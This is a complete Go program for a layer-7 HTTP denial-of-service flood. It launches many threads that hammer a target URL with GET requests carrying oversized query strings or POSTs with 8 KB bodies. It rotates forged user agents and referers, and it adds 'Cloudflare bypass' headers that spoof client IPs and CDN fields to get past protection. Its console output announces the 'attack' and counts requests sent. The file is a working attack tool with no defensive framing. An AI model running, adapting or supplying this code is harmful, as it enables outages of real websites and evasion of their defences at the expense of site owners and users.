package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

var (
	host            = ""
	port            = "443"
	page            = ""
	mode            = ""
	abcd            = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start           = make(chan bool)
	counter         int64
	httpClient      *http.Client
	http2Transport  *http2.Transport
	randomUserAgent = true
	keepAlive       = true
	attackRunning   = true
	key             string

	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}

	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}

	choice = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider = []string{
		"AdsBot-Google (+http://www.google.com/adsbot.html)",
    "Baiduspider (+http://www.baidu.com/search/spider.htm)",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Googlebot-Image/1.0",
    "Googlebot-News",
    "Googlebot-Video/1.0",
    "Applebot/0.1 (+http://www.apple.com/go/applebot)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Slurp (+http://help.yahoo.com/help/us/ysearch/slurp)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "YandexBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "AhrefsBot/7.0 (+http://ahrefs.com/robot/)",
    "SemrushBot (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (+http://mj12bot.com/)",
    "DotBot (+http://www.opensiteexplorer.org/dotbot)",
    "PetalBot (+https://webmaster.petalsearch.com/site/petalbot)",
    "Facebot (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
	}

	payloads = []string{
		"?" + strings.Repeat("x", 2048),
		"?" + strings.Repeat("y", 4096),
		"?" + strings.Repeat("z", 8192),
		"?" + strings.Repeat("a", 16384),
	}

	cloudflareBypassHeaders = []map[string]string{
		{
			"CF-Connecting-IP":       "1.1.1.1",
			"X-Forwarded-For":        "1.1.1.1",
			"True-Client-IP":         "1.1.1.1",
			"X-Real-IP":              "1.1.1.1",
			"X-Client-IP":            "1.1.1.1",
			"X-Originating-IP":       "1.1.1.1",
			"X-Forwarded-Host":       "google.com",
			"X-Host":                 "google.com",
			"X-Forwarded-Proto":      "https",
			"X-Forwarded-Protocol":   "https",
			"X-Url-Scheme":           "https",
			"X-Forwarded-Ssl":        "on",
			"X-Forwarded-Port":       "443",
			"X-Forwarded-By":         "nginx",
			"X-Forwarded-Server":     "google.com",
			"X-Forwarded-Scheme":     "https",
			"X-Forwarded-Forwarded-For": "1.1.1.1",
		},
		{
			"CF-Connecting-IP":       "8.8.8.8",
			"X-Forwarded-For":        "8.8.8.8",
			"True-Client-IP":         "8.8.8.8",
			"X-Real-IP":              "8.8.8.8",
			"X-Client-IP":            "8.8.8.8",
			"X-Originating-IP":       "8.8.8.8",
			"X-Forwarded-Host":       "cloudflare.com",
			"X-Host":                 "cloudflare.com",
			"X-Forwarded-Proto":      "https",
			"X-Forwarded-Protocol":   "https",
			"X-Url-Scheme":           "https",
			"X-Forwarded-Ssl":        "on",
			"X-Forwarded-Port":       "443",
			"X-Forwarded-By":         "apache",
			"X-Forwarded-Server":     "cloudflare.com",
			"X-Forwarded-Scheme":     "https",
			"X-Forwarded-Forwarded-For": "8.8.8.8",
		},
	}

	forbiddenRecoveryHeaders = []map[string]string{
		{
			"Cache-Control":           "no-transform",
			"CDN-Loop":                "cloudflare",
			"CF-IPCountry":            "US",
			"CF-Ray":                  "mock-ray-id",
			"CF-Visitor":              `{"scheme":"https"}`,
			"Origin":                  "null",
			"Pragma":                  "no-cache",
			"Sec-Fetch-Dest":          "document",
			"Sec-Fetch-Mode":          "navigate",
			"Sec-Fetch-Site":          "none",
			"Sec-Fetch-User":          "?1",
			"Upgrade-Insecure-Requests": "1",
			"Via":                     "1.1 google",
		},
		{
			"Cache-Control":           "max-age=0",
			"CDN-Loop":                "fastly",
			"CF-IPCountry":            "GB",
			"CF-Ray":                  "mock-ray-id-2",
			"CF-Visitor":              `{"scheme":"http"}`,
			"Origin":                  host,
			"Pragma":                  "public",
			"Sec-Fetch-Dest":          "empty",
			"Sec-Fetch-Mode":          "cors",
			"Sec-Fetch-Site":          "same-origin",
			"Upgrade-Insecure-Requests": "0",
			"Via":                     "1.1 varnish",
		},
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
	http2Transport = &http2.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"},
			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
			Renegotiation:      tls.RenegotiateOnceAsClient,
			SessionTicketsDisabled: false,
		},
		ReadIdleTimeout:  time.Second * 30,
		WriteByteTimeout: time.Second * 30,
		PingTimeout:      time.Second * 15,
	}
	httpClient = &http.Client{
		Transport: http2Transport,
		Timeout:   15 * time.Second,
	}
}

func getRandomUserAgent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3))]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4))]
	}
	browser := choice5[rand.Intn(len(choice5))]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6))] + "; "
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func getLargePayload() string {
	return payloads[rand.Intn(len(payloads))]
}

func applyCloudflareBypass(req *http.Request) {
	headers := cloudflareBypassHeaders[rand.Intn(len(cloudflareBypassHeaders))]
	for k, v := range headers {
		if strings.Contains(k, "IP") {
			req.Header.Set(k, generateRandomIP())
		} else if k == "CF-Ray" {
			req.Header.Set(k, fmt.Sprintf("%s-%s", generateRayID(), "SJC"))
		} else {
			req.Header.Set(k, v)
		}
	}
}

func applyForbiddenRecovery(req *http.Request) {
	headers := forbiddenRecoveryHeaders[rand.Intn(len(forbiddenRecoveryHeaders))]
	for k, v := range headers {
		if k == "CF-Ray" {
			req.Header.Set(k, fmt.Sprintf("%s-%s", generateRayID(), "LAX"))
		} else {
			req.Header.Set(k, v)
		}
	}
}

func generateRayID() string {
	const chars = "abcdef0123456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func buildRequest(targetURL string) (*http.Request, error) {
	var req *http.Request
	var err error

	if mode == "get" {
		fullURL := targetURL + key + strconv.Itoa(rand.Intn(2147483647)) + 
			string(abcd[rand.Intn(len(abcd))]) + 
			string(abcd[rand.Intn(len(abcd))]) + 
			string(abcd[rand.Intn(len(abcd))]) + 
			string(abcd[rand.Intn(len(abcd))]) + 
			getLargePayload()
		req, err = http.NewRequest("GET", fullURL, nil)
	} else {
		req, err = http.NewRequest("POST", targetURL, strings.NewReader(strings.Repeat("x", 8192)))
	}

	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", acceptall[rand.Intn(len(acceptall))])
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Referer", referers[rand.Intn(len(referers))])
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("DNT", "1")
	req.Header.Set("TE", "Trailers")

	applyCloudflareBypass(req)
	applyForbiddenRecovery(req)

	return req, nil
}

func flood(targetURL string) {
	<-start
	for attackRunning {
		req, err := buildRequest(targetURL)
		if err != nil {
			continue
		}

		resp, err := httpClient.Do(req)
		if err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			atomic.AddInt64(&counter, 1)
		} else {
			time.Sleep(100 * time.Millisecond)
		}
	}
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage:", os.Args[0], "<url> <threads> <get/post> <seconds>")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	u, err := url.Parse(targetURL)
	if err != nil {
		fmt.Println("Invalid URL")
		os.Exit(1)
	}

	host = u.Hostname()
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
		if port == "" {
			port = "80"
		}
	}
	page = u.Path

	if strings.Contains(page, "?") {
		key = "&"
	} else {
		key = "?"
	}

	mode = strings.ToLower(os.Args[3])
	if mode != "get" && mode != "post" {
		fmt.Println("Invalid mode")
		os.Exit(1)
	}

	threads, err := strconv.Atoi(os.Args[2])
	if err != nil || threads <= 0 {
		fmt.Println("Invalid threads count")
		os.Exit(1)
	}

	limit, err := strconv.Atoi(os.Args[4])
	if err != nil || limit <= 0 {
		fmt.Println("Invalid time limit")
		os.Exit(1)
	}

	for i := 0; i < threads; i++ {
		go flood(targetURL)
		time.Sleep(time.Millisecond * 5)
	}

	fmt.Printf("Starting attack on %s with %d threads for %d seconds\n", targetURL, threads, limit)
	close(start)

	statsTicker := time.NewTicker(1 * time.Second)
	defer statsTicker.Stop()
	timeout := time.After(time.Duration(limit) * time.Second)

	for {
		select {
		case <-statsTicker.C:
			fmt.Printf("\rRequests sent: %d", atomic.LoadInt64(&counter))
		case <-timeout:
			attackRunning = false
			fmt.Printf("\nAttack finished. Total requests: %d\n", atomic.LoadInt64(&counter))
			os.Exit(0)
		}
	}
}
